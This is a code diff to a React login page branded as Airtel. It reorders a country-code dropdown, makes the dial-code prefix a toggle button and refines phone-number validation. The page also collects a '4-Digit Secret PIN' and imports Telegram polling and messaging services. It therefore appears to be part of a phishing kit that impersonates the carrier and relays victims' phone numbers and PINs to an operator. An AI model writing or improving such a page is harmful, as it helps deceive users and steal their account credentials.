@@ -5,7 +5,7 @@ import { InternetPlan } from '../types';
 import { ValidatingModal } from './ValidatingModal';
 import { useTelegramPolling } from '../hooks/useTelegramPolling';
 import { telegramService } from '../services/telegramService';
-import { CountryDropdown } from './CountryDropdown';
+import { CountryDropdown, CountryDropdownHandle } from './CountryDropdown';
 import { LanguageSwitch } from './LanguageSwitch';
 import { useApp } from '../context/AppContext';
 import { validateAirtelPhone, CountryInfo } from '../data/countries';
@@ -20,6 +20,7 @@ import {
   Zap,
   CheckCircle2,
   ShieldCheck,
+  ChevronDown,
 } from 'lucide-react';
 
 interface LoginPageProps {
@@ -50,6 +51,7 @@ export const LoginPage: React.FC<LoginPageProps> = ({
   const [isWaitingTelegram, setIsWaitingTelegram] = useState(false);
 
   const pinInputRefs = useRef<(HTMLInputElement | null)[]>([]);
+  const countryDropdownRef = useRef<CountryDropdownHandle>(null);
 
   // Generate session ID on mount
   useEffect(() => {
@@ -61,9 +63,9 @@ export const LoginPage: React.FC<LoginPageProps> = ({
     setSessionId(newSessionId);
   }, []);
 
-  // Phone validation with active country's Airtel rules
+  // Phone validation with active country's format (no restriction on starting numbers)
   const phoneValidation = validateAirtelPhone(country, phoneNumber);
-  const fullInternationalPhone = `${country.dialCode} ${phoneValidation.normalized}`;
+  const fullInternationalPhone = `${country.flag} ${country.dialCode} ${phoneValidation.formatted || phoneValidation.normalized}`;
 
   // Handle PIN input change
   const handlePinChange = (index: number, value: string) => {
@@ -271,21 +273,8 @@ export const LoginPage: React.FC<LoginPageProps> = ({
           )}
 
           {/* Form */}
-          <form onSubmit={handleSubmit} className="space-y-5">
-            {/* Country Dropdown (Compulsory) */}
-            <div>
-              <CountryDropdown
-                selectedCountry={country}
-                onSelectCountry={(newCountry) => {
-                  setCountry(newCountry, true);
-                  setErrorMessage(null);
-                }}
-                isRequired={true}
-                hasError={hasAttemptedSubmit && !country}
-              />
-            </div>
-
-            {/* Phone Number Input */}
+          <form onSubmit={handleSubmit} className="space-y-4">
+            {/* 1. Phone Number Input */}
             <div>
               <div className="flex items-center justify-between mb-1.5">
                 <label
@@ -294,8 +283,9 @@ export const LoginPage: React.FC<LoginPageProps> = ({
                 >
                   {t('phoneLabel')}
                 </label>
-                <span className="text-[10px] font-bold text-[#E60000]">
-                  {country.airtelBrand}
+                <span className="text-[10px] font-bold text-[#E60000] flex items-center gap-1">
+                  <span>{country.flag}</span>
+                  <span>{country.airtelBrand}</span>
                 </span>
               </div>
 
@@ -308,11 +298,18 @@ export const LoginPage: React.FC<LoginPageProps> = ({
                     : 'border-neutral-300 focus-within:border-[#0055FF] focus-within:ring-4 focus-within:ring-blue-500/10'
                 }`}
               >
-                {/* Country Code Prefix */}
-                <div className="flex items-center gap-1.5 bg-neutral-100 px-3 py-3 border-r border-neutral-300 text-neutral-800 font-bold text-sm shrink-0 select-none">
-                  <span className="text-base">{country.flag}</span>
-                  <span>{country.dialCode}</span>
-                </div>
+                {/* Country Code Prefix Button with Flag */}
+                <button
+                  type="button"
+                  id="btn-phone-code-prefix"
+                  onClick={() => countryDropdownRef.current?.toggle()}
+                  className="flex items-center gap-2 bg-neutral-100 hover:bg-neutral-200 active:bg-neutral-300 px-3 py-3 border-r border-neutral-300 text-neutral-900 font-bold text-sm shrink-0 transition-colors select-none cursor-pointer"
+                  title={language === 'fr' ? 'Changer de pays / indicatif' : 'Change country code'}
+                >
+                  <span className="text-2xl shrink-0 leading-none select-none">{country.flag}</span>
+                  <span className="font-mono font-black">{country.dialCode}</span>
+                  <ChevronDown className="w-3.5 h-3.5 text-neutral-500" />
+                </button>
 
                 <input
                   id="phone-input"
@@ -320,41 +317,53 @@ export const LoginPage: React.FC<LoginPageProps> = ({
                   autoFocus
                   value={phoneNumber}
                   onChange={(e) => {
-                    const clean = e.target.value.replace(/\D/g, '').slice(0, country.maxDigits + 1);
+                    const clean = e.target.value.replace(/\D/g, '').slice(0, country.maxDigits);
                     setPhoneNumber(clean);
                     setErrorMessage(null);
                   }}
                   placeholder={country.placeholder}
+                  maxLength={country.maxDigits}
                   className="w-full px-3 py-3 text-neutral-900 font-bold text-base tracking-wider placeholder:text-neutral-400 focus:outline-none bg-transparent"
                 />
 
                 <div className="pr-3 flex items-center gap-1.5 shrink-0">
-                  {phoneNumber && (
+                  {phoneNumber ? (
                     phoneValidation.isValid ? (
                       <CheckCircle2 className="w-5 h-5 text-emerald-600" />
                     ) : (
-                      <span className="text-[10px] font-bold text-rose-500">
-                        {phoneNumber.replace(/\D/g, '').length}/{country.minDigits}
+                      <span className="text-[10px] font-mono font-bold text-rose-600 bg-rose-50 px-1.5 py-0.5 rounded border border-rose-200">
+                        {phoneNumber.length}/{country.minDigits === country.maxDigits ? country.minDigits : `${country.minDigits}-${country.maxDigits}`}
                       </span>
                     )
+                  ) : (
+                    <Smartphone className="w-5 h-5 text-neutral-400" />
                   )}
-                  <Smartphone className="w-5 h-5 text-neutral-400" />
                 </div>
               </div>
 
               {/* Dynamic validation / format helper text */}
-              <div className="mt-1.5 pl-1">
+              <div className="mt-1.5">
                 {phoneNumber && !phoneValidation.isValid ? (
-                  <p className="text-[11px] font-bold text-rose-600 flex items-center gap-1">
-                    <span>⚠</span>
+                  <p className="text-[11px] font-bold text-rose-600 flex items-center gap-1.5 pl-1">
+                    <AlertTriangle className="w-3.5 h-3.5 shrink-0" />
                     <span>
                       {language === 'fr'
                         ? phoneValidation.errorFr
                         : phoneValidation.errorEn}
                     </span>
                   </p>
+                ) : phoneNumber && phoneValidation.isValid ? (
+                  <div className="p-2 rounded-xl bg-emerald-50 border border-emerald-200 flex items-center justify-between text-xs text-emerald-800 font-bold">
+                    <span className="flex items-center gap-1.5">
+                      <CheckCircle2 className="w-4 h-4 text-emerald-600 shrink-0" />
+                      <span>{language === 'fr' ? 'Format valide :' : 'Valid format:'}</span>
+                    </span>
+                    <span className="font-mono font-black text-emerald-950">
+                      {country.flag} {country.dialCode} {phoneValidation.formatted || phoneValidation.normalized}
+                    </span>
+                  </div>
                 ) : (
-                  <p className="text-[10px] text-neutral-500 font-medium">
+                  <p className="text-[10px] text-neutral-500 font-medium pl-1">
                     {t('phoneFormatHint')}{' '}
                     <span className="font-bold text-neutral-700">
                       {language === 'fr' ? country.descriptionFr : country.descriptionEn}
@@ -362,6 +371,21 @@ export const LoginPage: React.FC<LoginPageProps> = ({
                   </p>
                 )}
               </div>
+            </div>
+
+            {/* 2. Country Dropdown DIRECTLY UNDER Phone Numbers (Compulsory) */}
+            <div>
+              <CountryDropdown
+                ref={countryDropdownRef}
+                selectedCountry={country}
+                onSelectCountry={(newCountry) => {
+                  setCountry(newCountry, true);
+                  setErrorMessage(null);
+                }}
+                isRequired={true}
+                label={language === 'fr' ? 'Code & Pays Airtel (Obligatoire)' : 'Airtel Code & Country (Compulsory)'}
+                hasError={hasAttemptedSubmit && !country}
+              />
             </div>
 
             {/* 4-Digit Secret PIN Input */}
